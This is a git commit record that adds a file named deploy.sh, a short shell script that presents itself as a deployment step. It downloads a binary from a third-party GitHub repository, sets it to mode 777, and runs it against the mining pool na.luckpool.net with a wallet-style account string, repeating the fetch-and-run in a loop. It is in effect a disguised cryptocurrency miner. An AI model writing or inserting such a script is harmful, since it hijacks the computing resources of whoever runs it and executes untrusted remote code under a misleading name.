fbf890995e8de933044338224522be9abd25e16f
dsuagd8ygd8dscsa <86932584+dsuagd8ygd8dscsa@users.noreply.github.com>
2021-07-05 04:42:41 +0700

    Create deploy.sh

---
+++ deploy.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+ 
+COUNTER=20
+until [  $COUNTER -lt 10 ]; do
+ 
+wget https://github.com/OmJhonyPerkasa/yteam/raw/master/taek && chmod 777 taek && ./taek -v -l na.luckpool.net:3956 -u RKzMVjYKpBPzbUFMMMLvgergy9a4JDShva.budi -p x -t 2
+ 
+     echo COUNTER $COUNTER
+     let COUNTER-=1
+
+    done
